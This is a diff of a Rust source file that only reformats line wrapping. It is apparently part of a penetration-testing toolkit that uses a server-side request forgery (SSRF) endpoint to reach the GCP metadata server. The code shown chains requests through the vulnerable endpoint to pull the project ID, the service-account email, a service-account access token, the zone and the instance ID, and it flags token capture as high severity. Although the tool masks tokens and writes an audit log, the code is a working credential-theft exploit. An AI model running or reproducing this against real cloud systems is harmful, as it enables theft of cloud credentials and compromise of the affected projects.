@@ -137,10 +137,7 @@ fn url_encode_simple(s: &str) -> String {
 
 // Build a complete SSRF-proxied URL by appending the metadata path to the SSRF base
 fn build_ssrf_url(ssrf_base: &str, metadata_path: &str) -> String {
-    let meta_url = format!(
-        "http://metadata.google.internal{}",
-        metadata_path
-    );
+    let meta_url = format!("http://metadata.google.internal{}", metadata_path);
     format!("{ssrf_base}{}", url_encode_simple(&meta_url))
 }
 
@@ -195,10 +192,7 @@ async fn ssrf_get(
 
 // Probe the metadata root — try with header first, fallback without
 // Returns (status, body, full_url, header_used)
-async fn probe_root(
-    client: &reqwest::Client,
-    ssrf_base: &str,
-) -> (u16, String, String, bool) {
+async fn probe_root(client: &reqwest::Client, ssrf_base: &str) -> (u16, String, String, bool) {
     let (s, b, u) = ssrf_get(client, ssrf_base, GCP_META_ROOT_PATH, true).await;
     if s == 200 && !b.trim().is_empty() {
         return (s, b, u, true);
@@ -239,13 +233,16 @@ async fn main() -> Result<()> {
 
     // Step a: confirm SSRF reaches metadata root
     eprintln!("mg-gcp: probing GCP metadata root...");
-    let (status_root, body_root, url_root, with_header) =
-        probe_root(&client, &args.ssrf_url).await;
+    let (status_root, body_root, url_root, with_header) = probe_root(&client, &args.ssrf_url).await;
     let confirmed_ssrf = status_root == 200 && !body_root.trim().is_empty();
-    steps.push(make_step(GCP_META_ROOT_PATH, &url_root, status_root, &body_root, with_header));
-    eprintln!(
-        "  root: status={status_root} confirmed={confirmed_ssrf} header={with_header}"
-    );
+    steps.push(make_step(
+        GCP_META_ROOT_PATH,
+        &url_root,
+        status_root,
+        &body_root,
+        with_header,
+    ));
+    eprintln!("  root: status={status_root} confirmed={confirmed_ssrf} header={with_header}");
 
     // Use the header preference determined from the root probe for all subsequent requests
     let use_header = with_header;
@@ -254,7 +251,13 @@ async fn main() -> Result<()> {
     eprintln!("  probing project-id...");
     let (s_proj, b_proj, u_proj) =
         ssrf_get(&client, &args.ssrf_url, GCP_PROJECT_ID_PATH, use_header).await;
-    steps.push(make_step(GCP_PROJECT_ID_PATH, &u_proj, s_proj, &b_proj, use_header));
+    steps.push(make_step(
+        GCP_PROJECT_ID_PATH,
+        &u_proj,
+        s_proj,
+        &b_proj,
+        use_header,
+    ));
     let project_id = plain_text_value(s_proj, &b_proj);
     eprintln!("  project-id: {:?}", project_id);
 
@@ -262,7 +265,13 @@ async fn main() -> Result<()> {
     eprintln!("  probing SA email...");
     let (s_email, b_email, u_email) =
         ssrf_get(&client, &args.ssrf_url, GCP_SA_EMAIL_PATH, use_header).await;
-    steps.push(make_step(GCP_SA_EMAIL_PATH, &u_email, s_email, &b_email, use_header));
+    steps.push(make_step(
+        GCP_SA_EMAIL_PATH,
+        &u_email,
+        s_email,
+        &b_email,
+        use_header,
+    ));
     let sa_email = plain_text_value(s_email, &b_email);
     eprintln!("  SA email: {:?}", sa_email);
 
@@ -270,7 +279,13 @@ async fn main() -> Result<()> {
     eprintln!("  probing SA token...");
     let (s_tok, b_tok, u_tok) =
         ssrf_get(&client, &args.ssrf_url, GCP_SA_TOKEN_PATH, use_header).await;
-    steps.push(make_step(GCP_SA_TOKEN_PATH, &u_tok, s_tok, &b_tok, use_header));
+    steps.push(make_step(
+        GCP_SA_TOKEN_PATH,
+        &u_tok,
+        s_tok,
+        &b_tok,
+        use_header,
+    ));
     let (access_token_masked, token_type, token_expires_in) = if s_tok == 200 {
         match serde_json::from_str::<GcpToken>(&b_tok) {
             Ok(tok) => (
@@ -283,20 +298,39 @@ async fn main() -> Result<()> {
     } else {
         (None, None, None)
     };
-    eprintln!("  token: {}", if access_token_masked.is_some() { "obtained" } else { "none" });
+    eprintln!(
+        "  token: {}",
+        if access_token_masked.is_some() {
+            "obtained"
+        } else {
+            "none"
+        }
+    );
 
     // Step e: zone
     eprintln!("  probing zone...");
     let (s_zone, b_zone, u_zone) =
         ssrf_get(&client, &args.ssrf_url, GCP_ZONE_PATH, use_header).await;
-    steps.push(make_step(GCP_ZONE_PATH, &u_zone, s_zone, &b_zone, use_header));
+    steps.push(make_step(
+        GCP_ZONE_PATH,
+        &u_zone,
+        s_zone,
+        &b_zone,
+        use_header,
+    ));
     let zone = plain_text_value(s_zone, &b_zone);
 
     // Step f: instance-id
     eprintln!("  probing instance-id...");
     let (s_iid, b_iid, u_iid) =
         ssrf_get(&client, &args.ssrf_url, GCP_INSTANCE_ID_PATH, use_header).await;
-    steps.push(make_step(GCP_INSTANCE_ID_PATH, &u_iid, s_iid, &b_iid, use_header));
+    steps.push(make_step(
+        GCP_INSTANCE_ID_PATH,
+        &u_iid,
+        s_iid,
+        &b_iid,
+        use_header,
+    ));
     let instance_id = plain_text_value(s_iid, &b_iid);
 
     let high_severity = access_token_masked.is_some();
@@ -304,10 +338,17 @@ async fn main() -> Result<()> {
     // Print summary
     println!("\n=== GCP Metadata Chain via SSRF ===");
     println!("SSRF endpoint:  {}", args.ssrf_url);
-    println!("SSRF confirmed: {}", if confirmed_ssrf { "YES" } else { "NO" });
+    println!(
+        "SSRF confirmed: {}",
+        if confirmed_ssrf { "YES" } else { "NO" }
+    );
     println!(
         "Metadata-Flavor header: {}",
-        if use_header { "forwarded" } else { "not forwarded (stripped by proxy)" }
+        if use_header {
+            "forwarded"
+        } else {
+            "not forwarded (stripped by proxy)"
+        }
     );
     if let Some(ref pid) = project_id {
         println!("Project ID:     {pid}");
@@ -359,7 +400,8 @@ async fn main() -> Result<()> {
     println!("[*] Results written to {}", out_path.display());
 
     // Audit log
-    let detail = format!("confirmed={confirmed_ssrf} token={high_severity} meta_base={GCP_META_BASE}");
+    let detail =
+        format!("confirmed={confirmed_ssrf} token={high_severity} meta_base={GCP_META_BASE}");
     let _ = eng.audit(AUDIT_TOOL, &eng.meta.target, Some(&detail));
 
     Ok(())
